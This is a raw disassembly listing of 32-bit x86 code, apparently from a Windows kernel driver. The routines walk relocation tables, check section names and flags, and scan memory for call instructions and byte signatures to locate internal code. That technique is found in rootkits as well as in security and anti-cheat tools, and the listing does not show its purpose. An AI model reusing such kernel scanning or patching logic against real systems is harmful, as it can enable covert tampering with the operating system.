   11e2b:	89 44 24 14          	mov    %eax,0x14(%esp)
   11e2f:	eb 04                	jmp    0x11e35
   11e31:	8b 44 24 14          	mov    0x14(%esp),%eax
   11e35:	0f b7 14 38          	movzwl (%eax,%edi,1),%edx
   11e39:	8b 2d f0 33 01 00    	mov    0x133f0,%ebp
   11e3f:	52                   	push   %edx
   11e40:	ff d5                	call   *%ebp
   11e42:	0f b7 0f             	movzwl (%edi),%ecx
   11e45:	51                   	push   %ecx
   11e46:	66 89 44 24 16       	mov    %ax,0x16(%esp)
   11e4b:	ff d5                	call   *%ebp
   11e4d:	0f b7 4c 24 12       	movzwl 0x12(%esp),%ecx
   11e52:	66 3b c1             	cmp    %cx,%ax
   11e55:	75 14                	jne    0x11e6b
   11e57:	83 c3 01             	add    $0x1,%ebx
   11e5a:	83 c7 02             	add    $0x2,%edi
   11e5d:	3b de                	cmp    %esi,%ebx
   11e5f:	72 d0                	jb     0x11e31
   11e61:	5d                   	pop    %ebp
   11e62:	5b                   	pop    %ebx
   11e63:	5f                   	pop    %edi
   11e64:	b0 01                	mov    $0x1,%al
   11e66:	5e                   	pop    %esi
   11e67:	83 c4 08             	add    $0x8,%esp
   11e6a:	c3                   	ret
   11e6b:	5d                   	pop    %ebp
   11e6c:	5b                   	pop    %ebx
   11e6d:	5f                   	pop    %edi
   11e6e:	32 c0                	xor    %al,%al
   11e70:	5e                   	pop    %esi
   11e71:	83 c4 08             	add    $0x8,%esp
   11e74:	c3                   	ret
   11e75:	cc                   	int3
   11e76:	cc                   	int3
   11e77:	cc                   	int3
   11e78:	cc                   	int3
   11e79:	cc                   	int3
   11e7a:	cc                   	int3
   11e7b:	cc                   	int3
   11e7c:	cc                   	int3
   11e7d:	cc                   	int3
   11e7e:	cc                   	int3
   11e7f:	cc                   	int3
   11e80:	83 ec 10             	sub    $0x10,%esp
   11e83:	56                   	push   %esi
   11e84:	8d 47 11             	lea    0x11(%edi),%eax
   11e87:	8d 74 24 10          	lea    0x10(%esp),%esi
   11e8b:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
   11e92:	00 
   11e93:	89 44 24 08          	mov    %eax,0x8(%esp)
   11e97:	e8 84 ed ff ff       	call   0x10c20
   11e9c:	8b 44 24 10          	mov    0x10(%esp),%eax
   11ea0:	6a 40                	push   $0x40
   11ea2:	68 00 10 00 00       	push   $0x1000
   11ea7:	8d 4c 24 10          	lea    0x10(%esp),%ecx
   11eab:	51                   	push   %ecx
   11eac:	8b 48 14             	mov    0x14(%eax),%ecx
   11eaf:	6a 00                	push   $0x0
   11eb1:	8d 54 24 1c          	lea    0x1c(%esp),%edx
   11eb5:	52                   	push   %edx
   11eb6:	6a ff                	push   $0xffffffff
   11eb8:	ff d1                	call   *%ecx
   11eba:	85 c0                	test   %eax,%eax
   11ebc:	75 0f                	jne    0x11ecd
   11ebe:	39 7c 24 08          	cmp    %edi,0x8(%esp)
   11ec2:	72 09                	jb     0x11ecd
   11ec4:	8b 44 24 0c          	mov    0xc(%esp),%eax
   11ec8:	5e                   	pop    %esi
   11ec9:	83 c4 10             	add    $0x10,%esp
   11ecc:	c3                   	ret
   11ecd:	33 c0                	xor    %eax,%eax
   11ecf:	5e                   	pop    %esi
   11ed0:	83 c4 10             	add    $0x10,%esp
   11ed3:	c3                   	ret
   11ed4:	cc                   	int3
   11ed5:	cc                   	int3
   11ed6:	cc                   	int3
   11ed7:	cc                   	int3
   11ed8:	cc                   	int3
   11ed9:	cc                   	int3
   11eda:	cc                   	int3
   11edb:	cc                   	int3
   11edc:	cc                   	int3
   11edd:	cc                   	int3
   11ede:	cc                   	int3
   11edf:	cc                   	int3
   11ee0:	83 ec 4c             	sub    $0x4c,%esp
   11ee3:	53                   	push   %ebx
   11ee4:	55                   	push   %ebp
   11ee5:	56                   	push   %esi
   11ee6:	57                   	push   %edi
   11ee7:	8b d8                	mov    %eax,%ebx
   11ee9:	68 74 52 01 00       	push   $0x15274
   11eee:	8d 44 24 14          	lea    0x14(%esp),%eax
   11ef2:	50                   	push   %eax
   11ef3:	ff 15 c0 33 01 00    	call   *0x133c0
   11ef9:	8b 2d c8 33 01 00    	mov    0x133c8,%ebp
   11eff:	33 f6                	xor    %esi,%esi
   11f01:	8d 4c 24 10          	lea    0x10(%esp),%ecx
   11f05:	c7 44 24 20 18 00 00 	movl   $0x18,0x20(%esp)
   11f0c:	00 
   11f0d:	89 74 24 24          	mov    %esi,0x24(%esp)
   11f11:	c7 44 24 2c 40 00 00 	movl   $0x40,0x2c(%esp)
   11f18:	00 
   11f19:	89 4c 24 28          	mov    %ecx,0x28(%esp)
   11f1d:	89 74 24 30          	mov    %esi,0x30(%esp)
   11f21:	89 74 24 34          	mov    %esi,0x34(%esp)
   11f25:	6a 60                	push   $0x60
   11f27:	6a 03                	push   $0x3
   11f29:	8d 54 24 20          	lea    0x20(%esp),%edx
   11f2d:	52                   	push   %edx
   11f2e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
   11f32:	50                   	push   %eax
   11f33:	68 00 00 10 c0       	push   $0xc0100000
   11f38:	53                   	push   %ebx
   11f39:	ff d5                	call   *%ebp
   11f3b:	8b f8                	mov    %eax,%edi
   11f3d:	85 ff                	test   %edi,%edi
   11f3f:	75 10                	jne    0x11f51
   11f41:	8b 0b                	mov    (%ebx),%ecx
   11f43:	89 4c b4 38          	mov    %ecx,0x38(%esp,%esi,4)
   11f47:	83 c6 01             	add    $0x1,%esi
   11f4a:	83 fe 07             	cmp    $0x7,%esi
   11f4d:	7e d6                	jle    0x11f25
   11f4f:	eb 03                	jmp    0x11f54
   11f51:	83 c6 01             	add    $0x1,%esi
   11f54:	83 ee 02             	sub    $0x2,%esi
   11f57:	78 13                	js     0x11f6c
   11f59:	8b 1d c4 33 01 00    	mov    0x133c4,%ebx
   11f5f:	90                   	nop
   11f60:	8b 54 b4 38          	mov    0x38(%esp,%esi,4),%edx
   11f64:	52                   	push   %edx
   11f65:	ff d3                	call   *%ebx
   11f67:	83 ee 01             	sub    $0x1,%esi
   11f6a:	79 f4                	jns    0x11f60
   11f6c:	8b c7                	mov    %edi,%eax
   11f6e:	5f                   	pop    %edi
   11f6f:	5e                   	pop    %esi
   11f70:	5d                   	pop    %ebp
   11f71:	5b                   	pop    %ebx
   11f72:	83 c4 4c             	add    $0x4c,%esp
   11f75:	c3                   	ret
   11f76:	cc                   	int3
   11f77:	cc                   	int3
   11f78:	cc                   	int3
   11f79:	cc                   	int3
   11f7a:	cc                   	int3
   11f7b:	cc                   	int3
   11f7c:	cc                   	int3
   11f7d:	cc                   	int3
   11f7e:	cc                   	int3
   11f7f:	cc                   	int3
   11f80:	83 ec 10             	sub    $0x10,%esp
   11f83:	56                   	push   %esi
   11f84:	8b 74 24 1c          	mov    0x1c(%esp),%esi
   11f88:	8b 46 0c             	mov    0xc(%esi),%eax
   11f8b:	8b 4e 08             	mov    0x8(%esi),%ecx
   11f8e:	3b 48 34             	cmp    0x34(%eax),%ecx
   11f91:	75 09                	jne    0x11f9c
   11f93:	33 c0                	xor    %eax,%eax
   11f95:	5e                   	pop    %esi
   11f96:	83 c4 10             	add    $0x10,%esp
   11f99:	c2 08 00             	ret    $0x8
   11f9c:	57                   	push   %edi
   11f9d:	8d 54 24 0c          	lea    0xc(%esp),%edx
   11fa1:	52                   	push   %edx
   11fa2:	8d 44 24 0c          	lea    0xc(%esp),%eax
   11fa6:	50                   	push   %eax
   11fa7:	33 ff                	xor    %edi,%edi
   11fa9:	6a 05                	push   $0x5
   11fab:	56                   	push   %esi
   11fac:	89 7c 24 18          	mov    %edi,0x18(%esp)
   11fb0:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
   11fb4:	e8 6c 10 00 00       	call   0x13025
   11fb9:	83 c4 10             	add    $0x10,%esp
   11fbc:	83 f8 02             	cmp    $0x2,%eax
   11fbf:	75 0a                	jne    0x11fcb
   11fc1:	5f                   	pop    %edi
   11fc2:	33 c0                	xor    %eax,%eax
   11fc4:	5e                   	pop    %esi
   11fc5:	83 c4 10             	add    $0x10,%esp
   11fc8:	c2 08 00             	ret    $0x8
   11fcb:	3b c7                	cmp    %edi,%eax
   11fcd:	74 0d                	je     0x11fdc
   11fcf:	5f                   	pop    %edi
   11fd0:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   11fd5:	5e                   	pop    %esi
   11fd6:	83 c4 10             	add    $0x10,%esp
   11fd9:	c2 08 00             	ret    $0x8
   11fdc:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
   11fe0:	53                   	push   %ebx
   11fe1:	55                   	push   %ebp
   11fe2:	8b 6c 24 10          	mov    0x10(%esp),%ebp
   11fe6:	03 cd                	add    %ebp,%ecx
   11fe8:	8d 5d 08             	lea    0x8(%ebp),%ebx
   11feb:	3b d9                	cmp    %ecx,%ebx
   11fed:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
   11ff1:	77 72                	ja     0x12065
   11ff3:	8b 45 04             	mov    0x4(%ebp),%eax
   11ff6:	85 c0                	test   %eax,%eax
   11ff8:	74 6b                	je     0x12065
   11ffa:	83 f8 08             	cmp    $0x8,%eax
   11ffd:	72 72                	jb     0x12071
   11fff:	83 c0 f8             	add    $0xfffffff8,%eax
   12002:	a8 01                	test   $0x1,%al
   12004:	75 6b                	jne    0x12071
   12006:	d1 e8                	shr    $1,%eax
   12008:	89 44 24 18          	mov    %eax,0x18(%esp)
   1200c:	ba 00 00 00 00       	mov    $0x0,%edx
   12011:	74 44                	je     0x12057
   12013:	8b 76 08             	mov    0x8(%esi),%esi
   12016:	8b 7d 00             	mov    0x0(%ebp),%edi
   12019:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
   12020:	0f b7 0c 53          	movzwl (%ebx,%edx,2),%ecx
   12024:	8b c1                	mov    %ecx,%eax
   12026:	25 ff 0f 00 00       	and    $0xfff,%eax
   1202b:	03 c7                	add    %edi,%eax
   1202d:	03 c6                	add    %esi,%eax
   1202f:	f7 c1 00 f0 00 00    	test   $0xf000,%ecx
   12035:	74 0f                	je     0x12046
   12037:	8b 4c 24 24          	mov    0x24(%esp),%ecx
   1203b:	3b c1                	cmp    %ecx,%eax
   1203d:	72 07                	jb     0x12046
   1203f:	83 c1 0c             	add    $0xc,%ecx
   12042:	3b c1                	cmp    %ecx,%eax
   12044:	72 3a                	jb     0x12080
   12046:	83 c2 01             	add    $0x1,%edx
   12049:	3b 54 24 18          	cmp    0x18(%esp),%edx
   1204d:	72 d1                	jb     0x12020
   1204f:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
   12053:	8b 74 24 28          	mov    0x28(%esp),%esi
   12057:	03 6d 04             	add    0x4(%ebp),%ebp
   1205a:	8d 5d 08             	lea    0x8(%ebp),%ebx
   1205d:	3b d9                	cmp    %ecx,%ebx
   1205f:	89 6c 24 10          	mov    %ebp,0x10(%esp)
   12063:	76 8e                	jbe    0x11ff3
   12065:	5d                   	pop    %ebp
   12066:	5b                   	pop    %ebx
   12067:	5f                   	pop    %edi
   12068:	33 c0                	xor    %eax,%eax
   1206a:	5e                   	pop    %esi
   1206b:	83 c4 10             	add    $0x10,%esp
   1206e:	c2 08 00             	ret    $0x8
   12071:	5d                   	pop    %ebp
   12072:	5b                   	pop    %ebx
   12073:	5f                   	pop    %edi
   12074:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   12079:	5e                   	pop    %esi
   1207a:	83 c4 10             	add    $0x10,%esp
   1207d:	c2 08 00             	ret    $0x8
   12080:	5d                   	pop    %ebp
   12081:	5b                   	pop    %ebx
   12082:	5f                   	pop    %edi
   12083:	b8 bb 00 00 c0       	mov    $0xc00000bb,%eax
   12088:	5e                   	pop    %esi
   12089:	83 c4 10             	add    $0x10,%esp
   1208c:	c2 08 00             	ret    $0x8
   1208f:	cc                   	int3
   12090:	0f be 11             	movsbl (%ecx),%edx
   12093:	8d 44 92 09          	lea    0x9(%edx,%edx,4),%eax
   12097:	0f af c2             	imul   %edx,%eax
   1209a:	0f be 51 01          	movsbl 0x1(%ecx),%edx
   1209e:	03 c2                	add    %edx,%eax
   120a0:	8d 54 80 09          	lea    0x9(%eax,%eax,4),%edx
   120a4:	0f af d0             	imul   %eax,%edx
   120a7:	0f be 41 02          	movsbl 0x2(%ecx),%eax
   120ab:	03 d0                	add    %eax,%edx
   120ad:	8d 44 92 09          	lea    0x9(%edx,%edx,4),%eax
   120b1:	0f af c2             	imul   %edx,%eax
   120b4:	0f be 51 03          	movsbl 0x3(%ecx),%edx
   120b8:	03 c2                	add    %edx,%eax
   120ba:	8d 54 80 09          	lea    0x9(%eax,%eax,4),%edx
   120be:	0f af d0             	imul   %eax,%edx
   120c1:	0f be 41 04          	movsbl 0x4(%ecx),%eax
   120c5:	03 d0                	add    %eax,%edx
   120c7:	8d 44 92 09          	lea    0x9(%edx,%edx,4),%eax
   120cb:	0f af c2             	imul   %edx,%eax
   120ce:	0f be 51 05          	movsbl 0x5(%ecx),%edx
   120d2:	03 c2                	add    %edx,%eax
   120d4:	8d 54 80 09          	lea    0x9(%eax,%eax,4),%edx
   120d8:	0f af d0             	imul   %eax,%edx
   120db:	0f be 41 06          	movsbl 0x6(%ecx),%eax
   120df:	0f be 49 07          	movsbl 0x7(%ecx),%ecx
   120e3:	03 d0                	add    %eax,%edx
   120e5:	8d 44 92 09          	lea    0x9(%edx,%edx,4),%eax
   120e9:	0f af c2             	imul   %edx,%eax
   120ec:	03 c1                	add    %ecx,%eax
   120ee:	c3                   	ret
   120ef:	cc                   	int3
   120f0:	8b ce                	mov    %esi,%ecx
   120f2:	33 c0                	xor    %eax,%eax
   120f4:	81 e9 64 34 01 00    	sub    $0x13464,%ecx
   120fa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
   12100:	8a 94 01 64 34 01 00 	mov    0x13464(%ecx,%eax,1),%dl
   12107:	22 90 64 34 01 00    	and    0x13464(%eax),%dl
   1210d:	3a 90 50 34 01 00    	cmp    0x13450(%eax),%dl
   12113:	75 21                	jne    0x12136
   12115:	83 c0 01             	add    $0x1,%eax
   12118:	83 f8 14             	cmp    $0x14,%eax
   1211b:	72 e3                	jb     0x12100
   1211d:	a1 04 34 01 00       	mov    0x13404,%eax
   12122:	83 c0 0d             	add    $0xd,%eax
   12125:	8d 4e 0d             	lea    0xd(%esi),%ecx
   12128:	8b d0                	mov    %eax,%edx
   1212a:	2b d1                	sub    %ecx,%edx
   1212c:	8b 09                	mov    (%ecx),%ecx
   1212e:	2b 08                	sub    (%eax),%ecx
   12130:	3b ca                	cmp    %edx,%ecx
   12132:	0f 94 c0             	sete   %al
   12135:	c3                   	ret
   12136:	32 c0                	xor    %al,%al
   12138:	c3                   	ret
   12139:	cc                   	int3
   1213a:	cc                   	int3
   1213b:	cc                   	int3
   1213c:	cc                   	int3
   1213d:	cc                   	int3
   1213e:	cc                   	int3
   1213f:	cc                   	int3
   12140:	53                   	push   %ebx
   12141:	55                   	push   %ebp
   12142:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
   12146:	56                   	push   %esi
   12147:	57                   	push   %edi
   12148:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
   1214f:	00 
   12150:	8b d8                	mov    %eax,%ebx
   12152:	8d 43 05             	lea    0x5(%ebx),%eax
   12155:	39 44 24 18          	cmp    %eax,0x18(%esp)
   12159:	76 7d                	jbe    0x121d8
   1215b:	80 3b e8             	cmpb   $0xe8,(%ebx)
   1215e:	75 61                	jne    0x121c1
   12160:	8b 40 fc             	mov    -0x4(%eax),%eax
   12163:	8d 74 18 05          	lea    0x5(%eax,%ebx,1),%esi
   12167:	56                   	push   %esi
   12168:	55                   	push   %ebp
   12169:	e8 f6 0c 00 00       	call   0x12e64
   1216e:	8b f8                	mov    %eax,%edi
   12170:	83 c4 08             	add    $0x8,%esp
   12173:	85 ff                	test   %edi,%edi
   12175:	74 4a                	je     0x121c1
   12177:	8b 4f 24             	mov    0x24(%edi),%ecx
   1217a:	81 e1 20 00 00 62    	and    $0x62000020,%ecx
   12180:	81 f9 20 00 00 60    	cmp    $0x60000020,%ecx
   12186:	75 39                	jne    0x121c1
   12188:	8b cf                	mov    %edi,%ecx
   1218a:	e8 01 ff ff ff       	call   0x12090
   1218f:	3d a8 b9 93 4b       	cmp    $0x4b93b9a8,%eax
   12194:	74 07                	je     0x1219d
   12196:	3d 1c 97 94 12       	cmp    $0x1294971c,%eax
   1219b:	75 24                	jne    0x121c1
   1219d:	8b 47 08             	mov    0x8(%edi),%eax
   121a0:	8b 4f 10             	mov    0x10(%edi),%ecx
   121a3:	3b c1                	cmp    %ecx,%eax
   121a5:	72 02                	jb     0x121a9
   121a7:	8b c1                	mov    %ecx,%eax
   121a9:	8b 57 0c             	mov    0xc(%edi),%edx
   121ac:	03 55 08             	add    0x8(%ebp),%edx
   121af:	03 d0                	add    %eax,%edx
   121b1:	8d 46 14             	lea    0x14(%esi),%eax
   121b4:	3b c2                	cmp    %edx,%eax
   121b6:	77 09                	ja     0x121c1
   121b8:	e8 33 ff ff ff       	call   0x120f0
   121bd:	84 c0                	test   %al,%al
   121bf:	75 20                	jne    0x121e1
   121c1:	8b 44 24 14          	mov    0x14(%esp),%eax
   121c5:	83 c0 01             	add    $0x1,%eax
   121c8:	83 c3 01             	add    $0x1,%ebx
   121cb:	83 f8 1e             	cmp    $0x1e,%eax
   121ce:	89 44 24 14          	mov    %eax,0x14(%esp)
   121d2:	0f 82 7a ff ff ff    	jb     0x12152
   121d8:	5f                   	pop    %edi
   121d9:	5e                   	pop    %esi
   121da:	5d                   	pop    %ebp
   121db:	33 c0                	xor    %eax,%eax
   121dd:	5b                   	pop    %ebx
   121de:	c2 08 00             	ret    $0x8
   121e1:	5f                   	pop    %edi
   121e2:	8b c6                	mov    %esi,%eax
   121e4:	5e                   	pop    %esi
   121e5:	5d                   	pop    %ebp
   121e6:	5b                   	pop    %ebx
   121e7:	c2 08 00             	ret    $0x8
   121ea:	cc                   	int3
   121eb:	cc                   	int3
   121ec:	cc                   	int3
   121ed:	cc                   	int3
   121ee:	cc                   	int3
   121ef:	cc                   	int3
   121f0:	51                   	push   %ecx
   121f1:	53                   	push   %ebx
   121f2:	55                   	push   %ebp
   121f3:	8b d9                	mov    %ecx,%ebx
   121f5:	83 c3 ed             	add    $0xffffffed,%ebx
   121f8:	3b c3                	cmp    %ebx,%eax
   121fa:	56                   	push   %esi
   121fb:	57                   	push   %edi
   121fc:	89 5c 24 10          	mov    %ebx,0x10(%esp)
   12200:	0f 83 c7 00 00 00    	jae    0x122cd
   12206:	83 c3 fc             	add    $0xfffffffc,%ebx
   12209:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
   12210:	3b c3                	cmp    %ebx,%eax
   12212:	0f 87 b5 00 00 00    	ja     0x122cd
   12218:	eb 06                	jmp    0x12220
   1221a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
   12220:	8b 08                	mov    (%eax),%ecx
   12222:	3b 0d 78 34 01 00    	cmp    0x13478,%ecx
   12228:	74 0f                	je     0x12239
   1222a:	83 c0 01             	add    $0x1,%eax
   1222d:	3b c3                	cmp    %ebx,%eax
   1222f:	76 ef                	jbe    0x12220
   12231:	5f                   	pop    %edi
   12232:	5e                   	pop    %esi
   12233:	5d                   	pop    %ebp
   12234:	33 c0                	xor    %eax,%eax
   12236:	5b                   	pop    %ebx
   12237:	59                   	pop    %ecx
   12238:	c3                   	ret
   12239:	b9 0e 00 00 00       	mov    $0xe,%ecx
   1223e:	ba 78 34 01 00       	mov    $0x13478,%edx
   12243:	8b f0                	mov    %eax,%esi
   12245:	8b 3e                	mov    (%esi),%edi
   12247:	3b 3a                	cmp    (%edx),%edi
   12249:	75 12                	jne    0x1225d
   1224b:	83 e9 04             	sub    $0x4,%ecx
   1224e:	83 c2 04             	add    $0x4,%edx
   12251:	83 c6 04             	add    $0x4,%esi
   12254:	83 f9 04             	cmp    $0x4,%ecx
   12257:	73 ec                	jae    0x12245
   12259:	85 c9                	test   %ecx,%ecx
   1225b:	74 5d                	je     0x122ba
   1225d:	0f b6 3e             	movzbl (%esi),%edi
   12260:	0f b6 2a             	movzbl (%edx),%ebp
   12263:	2b fd                	sub    %ebp,%edi
   12265:	75 45                	jne    0x122ac
   12267:	83 e9 01             	sub    $0x1,%ecx
   1226a:	83 c2 01             	add    $0x1,%edx
   1226d:	83 c6 01             	add    $0x1,%esi
   12270:	85 c9                	test   %ecx,%ecx
   12272:	74 46                	je     0x122ba
   12274:	0f b6 3e             	movzbl (%esi),%edi
   12277:	0f b6 2a             	movzbl (%edx),%ebp
   1227a:	2b fd                	sub    %ebp,%edi
   1227c:	75 2e                	jne    0x122ac
   1227e:	83 e9 01             	sub    $0x1,%ecx
   12281:	83 c2 01             	add    $0x1,%edx
   12284:	83 c6 01             	add    $0x1,%esi
   12287:	85 c9                	test   %ecx,%ecx
   12289:	74 2f                	je     0x122ba
   1228b:	0f b6 3e             	movzbl (%esi),%edi
   1228e:	0f b6 2a             	movzbl (%edx),%ebp
   12291:	2b fd                	sub    %ebp,%edi
   12293:	75 17                	jne    0x122ac
   12295:	83 e9 01             	sub    $0x1,%ecx
   12298:	83 c2 01             	add    $0x1,%edx
   1229b:	83 c6 01             	add    $0x1,%esi
   1229e:	85 c9                	test   %ecx,%ecx
   122a0:	74 18                	je     0x122ba
   122a2:	0f b6 3e             	movzbl (%esi),%edi
   122a5:	0f b6 12             	movzbl (%edx),%edx
   122a8:	2b fa                	sub    %edx,%edi
   122aa:	74 0e                	je     0x122ba
   122ac:	85 ff                	test   %edi,%edi
   122ae:	b9 01 00 00 00       	mov    $0x1,%ecx
   122b3:	7f 07                	jg     0x122bc
   122b5:	83 c9 ff             	or     $0xffffffff,%ecx
   122b8:	eb 02                	jmp    0x122bc
   122ba:	33 c9                	xor    %ecx,%ecx
   122bc:	85 c9                	test   %ecx,%ecx
   122be:	74 0f                	je     0x122cf
   122c0:	83 c0 01             	add    $0x1,%eax
   122c3:	3b 44 24 10          	cmp    0x10(%esp),%eax
   122c7:	0f 82 43 ff ff ff    	jb     0x12210
   122cd:	33 c0                	xor    %eax,%eax
   122cf:	5f                   	pop    %edi
   122d0:	5e                   	pop    %esi
   122d1:	5d                   	pop    %ebp
   122d2:	5b                   	pop    %ebx
   122d3:	59                   	pop    %ecx
   122d4:	c3                   	ret
   122d5:	cc                   	int3
   122d6:	cc                   	int3
   122d7:	cc                   	int3
   122d8:	cc                   	int3
   122d9:	cc                   	int3
   122da:	cc                   	int3
   122db:	cc                   	int3
   122dc:	cc                   	int3
   122dd:	cc                   	int3
   122de:	cc                   	int3
   122df:	cc                   	int3
   122e0:	83 ec 08             	sub    $0x8,%esp
   122e3:	55                   	push   %ebp
   122e4:	8b 6c 24 20          	mov    0x20(%esp),%ebp
   122e8:	56                   	push   %esi
   122e9:	8b 74 24 18          	mov    0x18(%esp),%esi
   122ed:	57                   	push   %edi
   122ee:	8b 7c 24 20          	mov    0x20(%esp),%edi
   122f2:	6a 00                	push   $0x0
   122f4:	6a 00                	push   $0x0
   122f6:	8d 44 24 18          	lea    0x18(%esp),%eax
   122fa:	50                   	push   %eax
   122fb:	8d 4c 24 18          	lea    0x18(%esp),%ecx
   122ff:	51                   	push   %ecx
   12300:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
   12304:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
   1230b:	00 
   1230c:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
   12313:	00 
   12314:	ff 15 24 34 01 00    	call   *0x13424
   1231a:	83 7c 24 0c 05       	cmpl   $0x5,0xc(%esp)
   1231f:	75 3e                	jne    0x1235f
   12321:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
   12326:	75 37                	jne    0x1235f
   12328:	8b cf                	mov    %edi,%ecx
   1232a:	8b c6                	mov    %esi,%eax
   1232c:	e8 bf fe ff ff       	call   0x121f0
   12331:	85 c0                	test   %eax,%eax
   12333:	0f 84 59 01 00 00    	je     0x12492
   12339:	8b 54 24 24          	mov    0x24(%esp),%edx
   1233d:	8b 0a                	mov    (%edx),%ecx
   1233f:	85 c9                	test   %ecx,%ecx
   12341:	74 11                	je     0x12354
   12343:	3b c1                	cmp    %ecx,%eax
   12345:	74 0d                	je     0x12354
   12347:	5f                   	pop    %edi
   12348:	5e                   	pop    %esi
   12349:	c6 45 00 01          	movb   $0x1,0x0(%ebp)
   1234d:	5d                   	pop    %ebp
   1234e:	83 c4 08             	add    $0x8,%esp
   12351:	c2 14 00             	ret    $0x14
   12354:	5f                   	pop    %edi
   12355:	5e                   	pop    %esi
   12356:	89 02                	mov    %eax,(%edx)
   12358:	5d                   	pop    %ebp
   12359:	83 c4 08             	add    $0x8,%esp
   1235c:	c2 14 00             	ret    $0x14
   1235f:	8d 4f f6             	lea    -0xa(%edi),%ecx
   12362:	3b f1                	cmp    %ecx,%esi
   12364:	8b c6                	mov    %esi,%eax
   12366:	0f 83 26 01 00 00    	jae    0x12492
   1236c:	83 c1 fc             	add    $0xfffffffc,%ecx
   1236f:	89 4c 24 10          	mov    %ecx,0x10(%esp)
   12373:	3b c1                	cmp    %ecx,%eax
   12375:	8b f8                	mov    %eax,%edi
   12377:	0f 87 15 01 00 00    	ja     0x12492
   1237d:	8d 49 00             	lea    0x0(%ecx),%ecx
   12380:	8b 17                	mov    (%edi),%edx
   12382:	3b 15 48 34 01 00    	cmp    0x13448,%edx
   12388:	74 10                	je     0x1239a
   1238a:	83 c7 01             	add    $0x1,%edi
   1238d:	3b f9                	cmp    %ecx,%edi
   1238f:	76 ef                	jbe    0x12380
   12391:	5f                   	pop    %edi
   12392:	5e                   	pop    %esi
   12393:	5d                   	pop    %ebp
   12394:	83 c4 08             	add    $0x8,%esp
   12397:	c2 14 00             	ret    $0x14
   1239a:	b8 05 00 00 00       	mov    $0x5,%eax
   1239f:	b9 48 34 01 00       	mov    $0x13448,%ecx
   123a4:	8b d7                	mov    %edi,%edx
   123a6:	8b 32                	mov    (%edx),%esi
   123a8:	3b 31                	cmp    (%ecx),%esi
   123aa:	75 12                	jne    0x123be
   123ac:	83 e8 04             	sub    $0x4,%eax
   123af:	83 c1 04             	add    $0x4,%ecx
   123b2:	83 c2 04             	add    $0x4,%edx
   123b5:	83 f8 04             	cmp    $0x4,%eax
   123b8:	73 ec                	jae    0x123a6
   123ba:	85 c0                	test   %eax,%eax
   123bc:	74 5d                	je     0x1241b
   123be:	0f b6 32             	movzbl (%edx),%esi
   123c1:	0f b6 29             	movzbl (%ecx),%ebp
   123c4:	2b f5                	sub    %ebp,%esi
   123c6:	75 45                	jne    0x1240d
   123c8:	83 e8 01             	sub    $0x1,%eax
   123cb:	83 c1 01             	add    $0x1,%ecx
   123ce:	83 c2 01             	add    $0x1,%edx
   123d1:	85 c0                	test   %eax,%eax
   123d3:	74 46                	je     0x1241b
   123d5:	0f b6 32             	movzbl (%edx),%esi
   123d8:	0f b6 29             	movzbl (%ecx),%ebp
   123db:	2b f5                	sub    %ebp,%esi
   123dd:	75 2e                	jne    0x1240d
   123df:	83 e8 01             	sub    $0x1,%eax
   123e2:	83 c1 01             	add    $0x1,%ecx
   123e5:	83 c2 01             	add    $0x1,%edx
   123e8:	85 c0                	test   %eax,%eax
   123ea:	74 2f                	je     0x1241b
   123ec:	0f b6 32             	movzbl (%edx),%esi
   123ef:	0f b6 29             	movzbl (%ecx),%ebp
   123f2:	2b f5                	sub    %ebp,%esi
   123f4:	75 17                	jne    0x1240d
   123f6:	83 e8 01             	sub    $0x1,%eax
   123f9:	83 c1 01             	add    $0x1,%ecx
   123fc:	83 c2 01             	add    $0x1,%edx
   123ff:	85 c0                	test   %eax,%eax
   12401:	74 18                	je     0x1241b
   12403:	0f b6 32             	movzbl (%edx),%esi
   12406:	0f b6 01             	movzbl (%ecx),%eax
   12409:	2b f0                	sub    %eax,%esi
   1240b:	74 0e                	je     0x1241b
   1240d:	85 f6                	test   %esi,%esi
   1240f:	b8 01 00 00 00       	mov    $0x1,%eax
   12414:	7f 07                	jg     0x1241d
   12416:	83 c8 ff             	or     $0xffffffff,%eax
   12419:	eb 02                	jmp    0x1241d
   1241b:	33 c0                	xor    %eax,%eax
   1241d:	85 c0                	test   %eax,%eax
   1241f:	75 53                	jne    0x12474
   12421:	8b 54 24 1c          	mov    0x1c(%esp),%edx
   12425:	8b cf                	mov    %edi,%ecx
   12427:	8d 34 10             	lea    (%eax,%edx,1),%esi
   1242a:	3b f7                	cmp    %edi,%esi
   1242c:	73 46                	jae    0x12474
   1242e:	80 39 e8             	cmpb   $0xe8,(%ecx)
   12431:	75 0f                	jne    0x12442
   12433:	8b 71 01             	mov    0x1(%ecx),%esi
   12436:	8d 74 0e 05          	lea    0x5(%esi,%ecx,1),%esi
   1243a:	3b 35 04 34 01 00    	cmp    0x13404,%esi
   12440:	74 0d                	je     0x1244f
   12442:	83 c0 01             	add    $0x1,%eax
   12445:	83 e9 01             	sub    $0x1,%ecx
   12448:	83 f8 78             	cmp    $0x78,%eax
   1244b:	72 da                	jb     0x12427
   1244d:	eb 25                	jmp    0x12474
   1244f:	8b 4c 24 20          	mov    0x20(%esp),%ecx
   12453:	8b 54 24 18          	mov    0x18(%esp),%edx
   12457:	51                   	push   %ecx
   12458:	52                   	push   %edx
   12459:	8b c7                	mov    %edi,%eax
   1245b:	e8 e0 fc ff ff       	call   0x12140
   12460:	85 c0                	test   %eax,%eax
   12462:	74 10                	je     0x12474
   12464:	8b 54 24 24          	mov    0x24(%esp),%edx
   12468:	8b 0a                	mov    (%edx),%ecx
   1246a:	85 c9                	test   %ecx,%ecx
   1246c:	74 04                	je     0x12472
